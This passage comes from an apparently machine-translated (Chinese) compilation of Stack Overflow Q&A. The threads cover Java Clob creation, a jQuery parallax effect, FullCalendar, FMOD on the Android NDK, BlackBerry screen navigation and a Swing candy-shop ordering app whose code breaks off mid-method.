-(void) setEditing:(BOOL)editing animated:(BOOL)animated
{
  [super setEditing:editing animated:animated];

[self.tableView setEditing:editing animated:animated];
}

// Override to support editing the table view.
- (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath
{
   if (editingStyle == UITableViewCellEditingStyleDelete) 
{
    [attachmentsArray removeObjectAtIndex:indexPath.row];
    [tableView deleteRowsAtIndexPaths:[NSArray arrayWithObject:indexPath]     withRowAnimation:UITableViewRowAnimationLeft];
    [tableView reloadData];
}   

} 
````  `更新 - 放置断点，`canEditRowAtIndexPath,editingStyleForRowAtIndexPath, commitEditingStyle`但控制永远不会去 commitEditingStyle。它只是在前两个之间循环。`

# java - 在 Java 中将字符串转换为 Clob

> ID：11427054
> 
> 赞同：13
> 
> 时间：2012-07-11T06:48:04.780
> 
> 标签：java, sql, string, clob

我有一种情况，我需要从 String 制作 Clob 对象。问题是我不能在该方法中使用 ConnectionManager。

我需要一些实用程序，例如

```
 public Clob getClob(String data){

 } 
```

谁能告诉我怎么做这个。

我也有oralce.sql.CLOB。但是它需要 Connection 来创建对象。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2018-02-27T08:54:37.030

那些仍在寻找替代答案的人，可以创建一个 Clob 对象而无需连接对象，如下所示。

```
Clob myClob = new javax.sql.rowset.serial.SerialClob(stringData.toCharArray()); 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-12-14T16:03:13.730

引发警告：Clob 未初始化。

您需要一个 OracleConnection 来使用 Oracle 数据库创建一个 Clob。

```
OracleConnection conn;  // initialize this first

Clob myClob = conn.createClob();

private OracleConnection conn = null;
public void setConnection( OracleConnection conn )
{
    this.conn = conn;
}

void setClob( String cookie ) throws SQLException
{
    Clob myClob = conn.createClob();
    myClob.setString( 1, cookie);
} 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2012-07-11T07:13:07.933

试试这个 ：

```
OracleConnection conn;  // initialize this first

CLOB clob = conn.createClob();

public Clob getClob(String data){

    return clob.setString(position, data);
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2018-07-25T10:07:08.153

为了初始化此处其他答案中提到的 OracleConnection，如果您正在为 java 存储过程执行此操作并且连接到存储该过程的数据库，则可以像这样初始化 Connection：

```
Connection conn = DriverManager.getConnection("jdbc:default:connection:"); 
```

并且需要此导入：

```
import oracle.jdbc.driver.OracleConnection; 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2020-02-10T11:58:27.147

如果您使用的是 spring boot 并且您只有一个 JdbcTemplate obj，您可以使用以下方法获得 Oracle 连接：

```
private JdbcTemplate  jdbcTemplate;   // or NamedParameterJdbcTemplate 
Clob myClob = this.jdbcTemplate.getJdbcTemplate().getDataSource().getConnection().createClob(); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-11-24T16:20:52.230

如果您正在寻找一个机会来创建一个`[N]Clob`没有连接的连接，您可以`NonContextualLobCreator`从 Hibernate 项目中使用。以下示例显示了`NCLob`使用字符串创建

```
String xml = "my blob content";
NClob clob = NonContextualLobCreator.INSTANCE.createNClob(xml);
entity.setXmlclob); 
```

至少从 Hibernate 4.2（可能更早）开始可用。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2020-01-29T22:04:11.137

在我这边，我使用

```
Clob generateProxy(String string) 
```

从

```
import org.hibernate.engine.jdbc.ClobProxy; 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2021-03-28T05:58:44.940

**我有一个像你一样的问题**，我需要在一个字段中存储一个 JSON。您不必将 BLOB 或 CLOB 用作 java 对象，但您可以将其存储为一个。

总结一下我的答案，**如果**您使用的是*ORACLE*数据库（这是一个总是会导致说其语言出现问题的数据库），请使用以下格式作为指南或最佳实践，它基于 oracle 文档本身来解决您的问题：

```
@Lob @Basic(fetch=LAZY)
@Column(name="REPORT")
protected String report; 
```

如您所见，用于整理数据的变量位于字符串中（无需转换），但它将存储为 LOB。

祝你好运！

# javascript - CSS 用于制作许多背景以不同的鼠标移动速度

> ID：11427057
> 
> 赞同：1
> 
> 时间：2012-07-11T06:48:12.313
> 
> 标签：javascript, jquery

嗨，我想创建一种效果，使背景以不同的速度移动到鼠标上，以产生几乎像 3d 一样的效果。

这就是我想要做的，我[发现了这个](http://www.freeglance.co.uk/submit)

有人可以向我解释或向我展示一些可以做到这一点的脚本吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T21:25:01.857

你说的是[视差效应](http://en.wikipedia.org/wiki/Parallax)。有许多现有的脚本和插件可让您执行此操作。例如，一个简单的搜索提示[该页面](http://smashinghub.com/7-jquery-parallax-and-scrolling-effect-plugins.htm)列出了 7 个不同的 jQuery 插件。

基本前提是根据鼠标当前的位置，将碎片分割成层，通过JS独立移动，然后根据需要隐藏不同的区域。

## 例子

这种效果的一个简单示例可能如下（请不要使用此代码，它不是很干净）：

### HTML

```
<div id="parallax">
    <img src="img1.png" alt="background"/>
    <img src="img2.png" alt="foreground"/>
</div> 
```

### JS

```
$('#parallax').on('mousemove', function (e) {
    $('img').eq(0).css('left', e.pageX);
    $('img').eq(1).css('left', e.pageX * 2);
}); 
```

在这个简单的例子中，前景图像的移动速度是背景图像的两倍。如您所见，您只需将每一块分开移动即可获得所需的效果。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T06:54:53.987

为什么不直接看那个页面源码中的js。它的 4 个图像绝对定位在鼠标移动事件中。

```
 $(document).mousemove(function(e) {
    var x = ((e.pageX/$(window).width())*100)*-1;
    var y = ((e.pageY/$(window).height())*100)*-1;
    var pos = (x/80*-1)+"% "+(y/80*-1)+"%";
    var pos2 = (x/3+60)+"% "+(y/3+60)+"%";
    var pos3 = (x/5+30)+"% "+(y/5+30)+"%";
    var pos4 = (x/2+60)+"% "+(y/2+60)+"%";
    $("#grid").css("background-position",pos);
    $("#bottom").css("background-position",pos2);
    $("#bottomoverlay").css("background-position",pos3);
    $("#bottomblur").css("background-position",pos4); }); 
```

# api - 如何从 mstsc 获取 IP 地址

> ID：11427065
> 
> 赞同：2
> 
> 时间：2012-07-11T06:49:01.597
> 
> 标签：api, visual-c++

我需要一个 API 来从 RemoteDesktop(mstsc) 获取 IP 地址。我真正想知道的是用户使用远程的IP。请帮助我

# fullcalendar - 两个月内的 FullCalendar Show 活动？

> ID：11427066
> 
> 赞同：1
> 
> 时间：2012-07-11T06:49:02.113
> 
> 标签：fullcalendar

我想在日历中显示两个月，即七月和八月。应隐藏所有其他月份，例如应禁用下个月或上个月按钮。

例如，如果一个事件是从 7 月 29 日到 8 月 3 日，则应该在两个月视图的同一窗口中显示。

FullCalendar 可以做到这一点吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-08-12T22:18:34.857

是的，在一页上使用两个日历；有关使用最近的 FullCalendar v2.0.2 版本的示例，请参阅[http://jsfiddle.net/wijgerden/W77vt/ 。](http://jsfiddle.net/wijgerden/W77vt/)

此示例仍然启用了上一个、下一个和今天的按钮（还显示了如何`viewRender`用于同步两个日历）。但是您可以通过更改`right: 'prev,next today'`为仅`right: ''`在`cal0`配置上（在 JavaScript 中）来删除它们。

# android-ndk - 纯粹从本机代码加载 FMOD

> ID：11427067
> 
> 赞同：6
> 
> 时间：2012-07-11T06:49:15.047
> 
> 标签：android-ndk, fmod

我在 FMOD 示例文件夹中找到了一个名为 nativeactivity 的示例，但不幸的是它使用了一些 java 代码：

```
package org.fmod.nativeactivity;

public class Example extends android.app.NativeActivity 
{
    static 
    {
        System.loadLibrary("fmodex");
        System.loadLibrary("main");
    }    
} 
```

Android.mk 看起来像这样：

```
LOCAL_PATH := $(call my-dir)

#
# FMOD Ex Shared Library
# 
include $(CLEAR_VARS)

LOCAL_MODULE            := fmodex
LOCAL_SRC_FILES         := libfmodex.so
LOCAL_EXPORT_C_INCLUDES := $(LOCAL_PATH)/inc

include $(PREBUILT_SHARED_LIBRARY)

#
# Example Library
#
include $(CLEAR_VARS)

LOCAL_MODULE           := main
LOCAL_SRC_FILES        := main.c
LOCAL_LDLIBS           := -llog -landroid
LOCAL_SHARED_LIBRARIES := fmodex
LOCAL_STATIC_LIBRARIES := android_native_app_glue

include $(BUILD_SHARED_LIBRARY)

$(call import-module,android/native_app_glue) 
```

没有java部分可以吗？如果是这样，我需要改变什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-15T14:46:02.403

我不知道你为什么要摆脱这几行Java。据我所知，这对您的应用程序的其余部分没有影响。

您需要 Java 的原因是 Android 系统加载器无法找到`libfmodex.so`解析`libghost.so`. 因此，加载`libghost.so`失败。Java 允许您在加载库之前预加载依赖项。

不幸的是，NativeActivity 本身只能加载一个库。2012 年 4 月发布了一项[请求](http://code.google.com/p/android/issues/detail?id=28329)，以在未来某个时间改善这种情况。

Currently, you can switch all your code that works with **fmod** to dynamic linking, or build a third shared library which will load **fmod** and then load the **ghost** library. In this situation, the loader will be able to resolve the references in **ghost** because **fmod** will already be loaded.

# android - Intent in android - 黑莓

> ID：11427074
> 
> 赞同：1
> 
> 时间：2012-07-11T06:49:31.610
> 
> 标签：android, android-intent, blackberry

我试图弄清楚 BlackBerry Java 中“Android Intent”的等价物是什么。我已经阅读了类似的问题/答案，但我一直无法使用它们。一个建议是有一种方法

```
public class StatusActivity extends MainScreen {

    String strResult;
    String strsessionFirstName;

    public void setResult(String value) {
        strResult = value;
    }
    public void setFirstName(String value) {
        strsessionFirstName = value;
    } 
```

从主类调用，如

```
if(strResult.equals("credentialaccepted"))
{
    StatusActivity nextScreen = new StatusActivity();
    nextScreen.setFirstName(strsessionFirstName); 
```

但这对我不起作用。使用的其他选项`Hashtable`，我一直无法理解。任何人都可以用示例代码解释吗？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:22:22.430

我想你已经看过我们[对这个问题的回答了](https://stackoverflow.com/questions/11375284/blackberry-how-to-pass-data-like-intent-putextra-in-android)？如果没有，请先阅读。

## 背景

黑莓不使用`Intent`对象，也没有直接的等价物。在 Android 中，`Intent`使用对象有不同的原因：

1.  简单地开始一个`Activity`
2.  将调用者与`Activity`自身`Activity`分离
3.  帮助 Android 管理`Activity`对象的生命周期（创建/挂起/恢复/销毁），如果人们只是直接创建它们，它就无法做到这一点`new MyActivity();`

那么，问题是，您要问的是这三个原因中的哪一个（或其他什么原因）？我的第一个猜测是＃1 ...您只想能够开始活动。

首先，黑莓没有相同的概念`Activity`。在 Android 中，您有一个**View**层，它通常由您的 XML 布局表示，可能带有一些扩展 Android 类的自定义 Java`View`类。

然后，Android 有一个`Activity`层，类似于Model-View- **Controller**模式中的 Controller。`Activity`不应该与 UI（视图）过于紧密地耦合，**理想**情况下，它不应该包含后端数据，后端数据应该存在于数据**模型**层中。

这真的很不错，因为程序员可以处理模型和控制器`Activity`（

黑莓没有像 Android 的**View**层那样的东西。要构建 BlackBerry UI，如果您使用本机 BlackBerry Java 平台和工具，则必须使用 Java 代码进行。因此，出于这个原因，我发现很少有 BlackBerry 项目努力将**Controller**层与**View**层分开。另外，我认为软件项目越大，模型-视图-控制器就越重要，并且相对于桌面应用程序，智能手机应用程序通常更小。所以，无论好坏，我认为这是 MVC 没有更直接地内置到 BlackBerry API 中的一个原因。

## 一种解决方案

因此，正如您的代码片段所暗示的那样，很多人将 Android`Activity`子类中的逻辑放入`Screen`BlackBerry 的子类中。它将控制器逻辑与 UI 更紧密地结合在一起，但有时这是可以接受的。

如果您对此感到满意，那么您通常会使用如下简单的代码启动屏幕（*活动）：*

```
StatusActivity nextScreen = new StatusActivity();
nextScreen.setFirstName(strsessionFirstName);
UiApplication.getUiApplication().pushScreen(nextScreen); 
```

Android`Activity`在`onCreate()`方法中具有的用于检查`Intent`附加内容和设置视图的逻辑可能位于`StatusActivity`. 如果某些 UI 初始化取决于 的值`strsessionFirstName`，那么您可以在`setFirstName()`方法中设置该 UI：

状态活动.java：

```
private LabelField _nameLabel;

public void setFirstName(String value) {
   if (_nameLabel == null) {
      _nameLabel = new LabelField(value);
      add(_nameLabel); // add the new field to the screen
   } else {
      _nameLabel.setText(value);
   }
} 
```

或者，您可以将 firstName 传递给`String`构造`StatusActivity`函数，然后进行设置。

## 另一种解决方案

[史密斯先生在我上面链接的另一个问题中的建议](https://stackoverflow.com/a/11390807/119114)是为您的所有黑莓“活动”创建一个通用接口，您可以在其中使用键值对设置属性。所以，而不是实施`setFirstName()`，你会做

状态活动.java：

```
private Hashtable _extras = new Hashtable();
private LabelField _nameLabel;

public void putExtra(String name, Object value) {
    _extras.put(name, value);
}

// NOTE: this method is private now, and can only be called from inside this class!
private void setFirstName(String value) {
   if (_nameLabel == null) {
      _nameLabel = new LabelField(value);
      add(_nameLabel); // add the new field to the screen
   } else {
      _nameLabel.setText(value);
   }
}

// this overrides a base class method, and is called with the screen is displayed
public void onUiEngineAttached(boolean attached) {
    super.onUiEngineAttached(attached);
    if (attached) {
        String firstName = _extras.get("first_name");
        setFirstName(firstName);
    }
} 
```

然后你可以这样开始`StatusActivity`：

```
StatusActivity nextScreen = new StatusActivity();
nextScreen.putExtra("first_name", strsessionFirstName);
UiApplication.getUiApplication().pushScreen(nextScreen); 
```

# java - ButtonListener 没有反应

> ID：11427076
> 
> 赞同：0
> 
> 时间：2012-07-11T06:49:48.467
> 
> 标签：java, swing, actionlistener

我尝试了几种不同的方法来尝试使此代码正常工作，但都没有成功。我有一个 ButtonListener 连接到两个不同的按钮。第一个完美运行。第二个根本不执行。这是怎么回事？

先感谢您。

```
import javax.swing.*;
import java.util.*;
import java.awt.*;
import java.awt.event.*;
import javax.swing.event.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.*;
import javax.imageio.*;
import java.text.NumberFormat;

public class ClientApp extends JFrame
{
    public static void main(String[] args)
    {
        new ClientApp();
    }

    //Declarations so they have scope outside of ClientApp()
    private JButton switchCard;
    private JPanel infoPanel;
    private JPanel mainPanel;
    private JPanel cartPanel;
    private JPanel orderingPanel;
    private JList candyList;
    private CardLayout cl = new CardLayout();
    private CardLayout cl2 = new CardLayout();
    private JPanel checkoutPanel;
    private JButton checkoutButton;
    private JTextField acidPopsTF;
    private JTextField bertieBottsTF;
    private JTextField bloodPopsTF;
    private JTextField cauldronCakesTF;
    private JTextField charmChocTF;
    private JTextField chocoballsTF;
    private JTextField chocCauldronsTF;
    private JTextField chocFrogsTF;
    private JTextField chocWandsTF;
    private JTextField roachClustersTF;
    private JTextField crystalPineappleTF;
    private JTextField droobleGumTF;
    private JTextField explodeBonbonsTF;
    private JTextField fizzWhizTF;
    private JTextField iceMiceTF;
    private JTextField jellySlugsTF;
    private JTextField liquorWandsTF;
    private JTextField pepImpsTF;
    private JTextField pinkCocoIceTF;
    private JTextField spindleSpidersTF;
    private JTextField sugarQuillsTF;
    private JTextField wizochocTF;
    private JTextField shockChocTF;
    private ArrayList cart;
    private Object[] cartArray;
    private String CART = "cart";
    private String BROWSE = "ordering";

    public ClientApp()
    {
        this.setSize(750,400);
        this.setTitle("Honeydukes Muggle Ordering System");
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        ButtonListener bl = new ButtonListener();

        //Creating the panels
        mainPanel = new JPanel(cl2);
        cartPanel = new JPanel();
        orderingPanel = new JPanel(new BorderLayout());
        infoPanel = new JPanel(cl);
        JPanel invntryPanel = new JPanel(new BorderLayout());
        checkoutPanel = new JPanel(new BorderLayout());

        //Creating the array for the invntryPanel Jlist

        String[] candy = {"Acid Pops", "Bertie Bott's Every Flavour Beans",
                          "Blood-flavoured Lollipops",
                          "Cauldron Cakes", "Charm Choc",
                          "Chocoballs", "Chocolate Cauldrons",
                          "Chocolate Frogs","Chocolate Wands",
                          "Cockroach Clusters", "Crystallised Pineapple",
                          "Drooble's Best Blowing Gum", "Exploding Bonbons",
                          "Fizzing Whizbees", "Ice Mice",
                          "Jelly Slugs", "Liquourice Wands",
                          "Pepper Imps", "Pink Coconut Ice",
                          "Shock-o-Choc", "Splindle's Lick'O'Rish Spiders",
                          "Sugar Quills", "Wizochoc"};
        candyList = new JList(candy);
        candyList.setVisibleRowCount(18);
        candyList.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);

        //Creating a scrollpane for the JList
        JScrollPane scroll = new JScrollPane(candyList, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS,
                                             JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
        invntryPanel.add(scroll);

        switchCard = new JButton("View Product");
        switchCard.addActionListener(bl);
        invntryPanel.add(switchCard, BorderLayout.PAGE_END);

        //Creating the cards
        JPanel startCard = new JPanel(new BorderLayout());
        JPanel acidPopsCard = new JPanel(new BorderLayout());
        JPanel bertieBottsCard = new JPanel(new BorderLayout());
        JPanel bloodPopsCard = new JPanel(new BorderLayout());
        JPanel cauldronCakesCard = new JPanel(new BorderLayout());
        JPanel charmChocCard = new JPanel(new BorderLayout());
        JPanel chocoballsCard = new JPanel(new BorderLayout());
        JPanel chocCauldronsCard = new JPanel(new BorderLayout());
        JPanel chocFrogsCard = new JPanel(new BorderLayout());
        JPanel chocWandsCard = new JPanel(new BorderLayout());
        JPanel roachClustersCard = new JPanel(new BorderLayout());
        JPanel crystalPineappleCard = new JPanel(new BorderLayout());
        JPanel droobleGumCard = new JPanel(new BorderLayout());
        JPanel explodeBonbonsCard = new JPanel(new BorderLayout());
        JPanel fizzWhizCard = new JPanel(new BorderLayout());
        JPanel iceMiceCard = new JPanel(new BorderLayout());
        JPanel jellySlugsCard = new JPanel(new BorderLayout());
        JPanel liquorWandsCard = new JPanel(new BorderLayout());
        JPanel pepImpsCard = new JPanel(new BorderLayout());
        JPanel pinkCocoIceCard = new JPanel(new BorderLayout());
        JPanel shockChocCard = new JPanel(new BorderLayout());
        JPanel spindleSpidersCard = new JPanel(new BorderLayout());
        JPanel sugarQuillsCard = new JPanel(new BorderLayout());
        JPanel wizochocCard = new JPanel(new BorderLayout());

        //Adding the cards to the infoPanel
        infoPanel.add(startCard, "Start");
        infoPanel.add(acidPopsCard, "Acid Pops");
        infoPanel.add(bertieBottsCard, "Bertie Bott's Every Flavour Beans");
        infoPanel.add(bloodPopsCard, "Blood-flavoured Lollipops");
        infoPanel.add(cauldronCakesCard, "Cauldron Cakes");
        infoPanel.add(charmChocCard, "Charm Choc");
        infoPanel.add(chocoballsCard, "Chocoballs");
        infoPanel.add(chocCauldronsCard, "Chocolate Cauldrons");
        infoPanel.add(chocFrogsCard, "Chocolate Frogs");
        infoPanel.add(chocWandsCard, "Chocolate Wands");
        infoPanel.add(roachClustersCard, "Cockroach Clusters");
        infoPanel.add(crystalPineappleCard, "Crystallised Pineapple");
        infoPanel.add(droobleGumCard, "Drooble's Best Blowing Gum");
        infoPanel.add(explodeBonbonsCard, "Exploding Bonbons");
        infoPanel.add(fizzWhizCard, "Fizzing Whizbees");
        infoPanel.add(iceMiceCard, "Ice Mice");
        infoPanel.add(jellySlugsCard, "Jelly Slugs");
        infoPanel.add(liquorWandsCard, "Liquourice Wands");
        infoPanel.add(pepImpsCard, "Pepper Imps");
        infoPanel.add(pinkCocoIceCard, "Pink Coconut Ice");
        infoPanel.add(shockChocCard, "Shock-o-Choc");
        infoPanel.add(spindleSpidersCard, "Splindle's Lick'O'Rish Spiders");
        infoPanel.add(sugarQuillsCard, "Sugar Quills");
        infoPanel.add(wizochocCard, "Wizochoc");

        //building the cards
        startBuilder("honeydukes.jpg", "<html><center>Welcome to the Honeydukes Muggle Ordering System!<br />Please select from one of our products to the left to begin!</center></html>", startCard);
        verticalBuilder("acidPops.jpg", "<html><center>One of our more exotic treats, Acid Pops are sure to pack a punch!<br /><small>Disclaimer: Honeydukes is not responsible for any injury resulting from use of our products.</small><br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$5.95</center></html>", acidPopsTF, acidPopsCard);
        verticalBuilder("BertieBotts.jpg", "<html><center>A classic wizard candy, Bertie Bott's are known for having a danger in every mouthful. Is that light brown one toffee, or is it earwax? Only one way to find out!<br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$16.95</center></html>", bertieBottsTF, bertieBottsCard);
        verticalBuilder("bloodpop.jpg", "<html><center>For those of more unusual tastes, we have this most interesting lollipop. We won't ask any questions, and anonymity is guaranteed.<br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$5.95</center></html>", bloodPopsTF, bloodPopsCard);
        verticalBuilder("cauldroncake.jpg", "<html><center>A wizarding favourite, cauldron cakes are chocolate on the outside, and pure heaven on the inside. No desert is complete without one!<br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$14.95</center></html>", cauldronCakesTF, cauldronCakesCard);
        verticalBuilder("charmchoc.jpg", "<html><center>A candy staple, not only is Charm Choc made of the finest chocolate, it's also charmed for extra flavour!<br /><br />$5.95</center></html>", charmChocTF, charmChocCard);
        horizontalBuilder("chocoballs.jpg", "<html><center>One of our most popular candies, Chocoballs are chocolate on the outside, but the inside is full of delicious strawberry mousse and clotted cream!<br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$9.95</center></html>", chocoballsTF, chocoballsCard);
        verticalBuilder("choccauldrons.jpg", "<html><center>A wizarding favourite, each and every Chocolate Cauldron are filled to the brim with our own special brew of Firewhiskey!<br /><br />NOTICE: The Ministry of Magic would like to remind all that Firewhisky is an alcoholic beverage, and is not to be consumed by those who are underaged.<br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$14.95</center></html>", chocCauldronsTF, chocCauldronsCard);
        verticalBuilder("chocfrogs.jpg", "<html><center>One of the most famous wizarding sweets, Chocolate Frogs are made of the finest Croakoa, enabling them to behave like actual frogs! Each Chocolate Frog comes with card featuring a famous witch or wizard! Try to collect them all!<br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$14.95</center></html>", chocFrogsTF, chocFrogsCard);
        horizontalBuilder("chocwands.jpg", "<html><center>Popular as both a gag gift and a tasty treat, chocolate wands are one candy that nobody leaves the shop without!<br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$9.95</center></html>", chocWandsTF, chocWandsCard);
        verticalBuilder("cockroachclusters.jpg", "<html><center>Great for tricking friends or quenching your insatiable hunger for cockroaches, these peculiar treats will never get old!<br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$5.95</center></html>", roachClustersTF, roachClustersCard);
        verticalBuilder("crystalpineapple.jpg", "<html><center>Endorsed by Professor Horace Slughorn himself, Crystallised pineapple consists of the best pineapples diced up, and then cooked in sugar syrup. This is one sweet treat you don't want to be without!<br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$9.95</center></html>", crystalPineappleTF, crystalPineappleCard);
        verticalBuilder("gum.jpg", "<html><center>Guaranteed to never lose its flavour, Drooble's Best Blowing Gum will let you blow bubbles that last for days, and is the best wizarding gum out there!<br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$2.95</center></html>", droobleGumTF, droobleGumCard);
        verticalBuilder("bonbons.jpg", "<html><center>Produced by Kaboon Choco Ltd., these treats pop in your mouth -- literally!<br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$9.95</center></html>", explodeBonbonsTF, explodeBonbonsCard);
        verticalBuilder("whizbees.jpg", "<html><center>Made from delicious sherbert, Fizzing Whizbees have the effect of also causing you to float a few inches off the ground while sucking on them!<br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$9.95</center></html>", fizzWhizTF, fizzWhizCard);
        verticalBuilder("mice.jpg", "<html><center>Charmed to stay cold up to the point of being enjoyed, ice mice will also cause your teeeth to chatter and squeak!<br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$5.95</center></html>", iceMiceTF, iceMiceCard);
        verticalBuilder("slugs.jpg", "Perhaps the single most popular sweet, Jelly Slugs are a classic!<br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$2.95</center></html>", jellySlugsTF, jellySlugsCard);
        verticalBuilder("liqwand.jpg", "<html><center>Another favourite, these wands won't win you any duels, but they sure are tasty!<br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$9.95</center></html>", liquorWandsTF, liquorWandsCard);
        verticalBuilder("imps.jpg", "<html><center>Famous for making anyone who eats them smoke at the ears and nose, these spicy treats are delicious!<br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$4.95</center></html>", pepImpsTF, pepImpsCard);
        verticalBuilder("pinkice.jpg", "<html><center>Amazing in every way, these shimmering pink squares are even more enjoyable than they look!<br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$4.95</center></html>", pinkCocoIceTF, pinkCocoIceCard);
        verticalBuilder("shock.jpg", "<html><center>Add some SHOCK to your Choc-o-late! Perfect for practical jokes, and tasty too!<br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$4.95</center></html>", shockChocTF, shockChocCard);
        verticalBuilder("spiders.jpg", "<html><center>Made entirely out of liquorice, these treats are even bewitched to seem alive!<br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$4.95</center></html>", spindleSpidersTF, spindleSpidersCard);
        verticalBuilder("quill.jpg", "<html><center>Perfect for nibbling on during lectures, the professor will never know the difference between you thinking and you enjoying a delicious sugar quill!<br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$1.95</center></html>", sugarQuillsTF, sugarQuillsCard);
        verticalBuilder("wizochoc.jpg", "<html><center>There's been an age old debate between wizards of all ages as to whether CharmChoc or WizoChoc is better. Now Muggles can join in as well!<br /><br /><br />Type the quantity of this product you would like to order below.<br /><br />$5.95</center></html>", wizochocTF, wizochocCard);

        //Creating the interface element for advancing to the checkout screen
        checkoutButton = new JButton("Checkout");
        checkoutPanel.add(checkoutButton, BorderLayout.LINE_END);

        //Adding everything to the frame
        orderingPanel.add(checkoutPanel, BorderLayout.PAGE_END);
        orderingPanel.add(invntryPanel, BorderLayout.LINE_START);
        orderingPanel.add(infoPanel, BorderLayout.CENTER);

        mainPanel.add(orderingPanel, BROWSE);
        mainPanel.add(cartPanel, CART);
        this.add(mainPanel);
        this.setVisible(true);
    }

    void startBuilder(String p, String l, JPanel n)
    {
    try {
        BufferedImage myPicture = ImageIO.read(new File(p));
        JLabel picLabel = new JLabel(new ImageIcon(myPicture));
        n.add(picLabel, BorderLayout.LINE_END);
        }
    catch (IOException e) {}
    JLabel lbl = new JLabel(l);
    n.add(lbl, BorderLayout.CENTER);
    }

    void verticalBuilder(String p, String l, JTextField t, JPanel n)
    {
    try {
        BufferedImage myPicture = ImageIO.read(new File(p));
        JLabel picLabel = new JLabel(new ImageIcon(myPicture));
        n.add(picLabel, BorderLayout.LINE_END);
        }
    catch (IOException e) {}
    JLabel lbl = new JLabel(l);
    n.add(lbl, BorderLayout.CENTER);
    t = new JTextField();
    n.add(t, BorderLayout.PAGE_END);
    }

    void horizontalBuilder(String p, String l, JTextField t, JPanel n)
    {
    try {
        BufferedImage myPicture = ImageIO.read(new File(p));
        JLabel picLabel = new JLabel(new ImageIcon(myPicture));
        n.add(picLabel, BorderLayout.PAGE_START);
        }
    catch (IOException e) {}
    JLabel Lbl = new JLabel(l);
    n.add(Lbl, BorderLayout.CENTER);
    t = new JTextField();
    n.add(t, BorderLayout.PAGE_END);
    }

    private class ButtonListener implements ActionListener {
        public void actionPerformed(ActionEvent e)
        {
            if (e.getSource() == switchCard)
            {
                cl.show(infoPanel, (String)candyList.getSelectedValue());
                checkoutButton.addActionListener(this);
            }

            else if (e.getSource() == checkoutButton)
            {
                NumberFormat cf = NumberFormat.getCurrencyInstance();

                String acidPopsCost = cf.format(Total(1, 5.95, acidPopsTF));
                String bertieBottsCost = cf.format(Total(1, 16.95, bertieBottsTF));
                String bloodPopsCost = cf.format(Total(1, 5.95, bloodPopsTF));
                String cauldronCakesCost = cf.format(Total(1, 14.95, cauldronCakesTF));
                String charmChocCost = cf.format(Total(1, 5.95, charmChocTF));
                String chocoballsCost = cf.format(Total(1, 9.95, chocoballsTF));
                String chocCauldronsCost = cf.format(Total(1, 14.95, chocCauldronsTF));
                String chocFrogsCost = cf.format(Total(1, 14.95, chocFrogsTF));
                String chocWandsCost = cf.format(Total(1, 9.95, chocWandsTF));
                String roachClustersCost = cf.format(Total(1, 5.95, roachClustersTF));
                String crystalPineappleCost = cf.format(Total(1, 9.95, crystalPineappleTF));
                String droobleGumCost = cf.format(Total(1, 2.95, droobleGumTF));
                String explodeBonbonsCost = cf.format(Total(1, 9.95, explodeBonbonsTF));
                String fizzWhizCost = cf.format(Total(1, 9.95, fizzWhizTF));
                String iceMiceCost = cf.format(Total(1, 5.95, iceMiceTF));
                String jellySlugsCost = cf.format(Total(1, 2.95, jellySlugsTF));
                String liquorWandsCost = cf.format(Total(1, 9.95, liquorWandsTF));
                String pepImpsCost = cf.format(Total(1, 4.95, pepImpsTF));
                String pinkCocoIceCost = cf.format(Total(1, 4.95, pinkCocoIceTF));
                String shockChocCost = cf.format(Total(1, 4.95, shockChocTF));
                String spindleSpidersCost = cf.format(Total(1, 4.95, spindleSpidersTF));
                String sugarQuillsCost = cf.format(Total(1, 1.95, sugarQuillsTF));
                String wizochocCost = cf.format(Total(1, 5.95, wizochocTF));

                int acidPopsNum = (int)Total(0, 0, acidPopsTF);
                int bertieBottsNum = (int)Total(0, 0, bertieBottsTF);
                int bloodPopsNum = (int)Total(0, 0, bloodPopsTF);
                int cauldronCakesNum = (int)Total(0, 0, cauldronCakesTF);
                int charmChocNum = (int)Total(0, 0, charmChocTF);
                int chocoballsNum = (int)Total(0, 0, chocoballsTF);
                int chocCauldronsNum = (int)Total(0, 0, chocCauldronsTF);
                int chocFrogsNum = (int)Total(0, 0, chocFrogsTF);
                int chocWandsNum = (int)Total(0, 0, chocWandsTF);
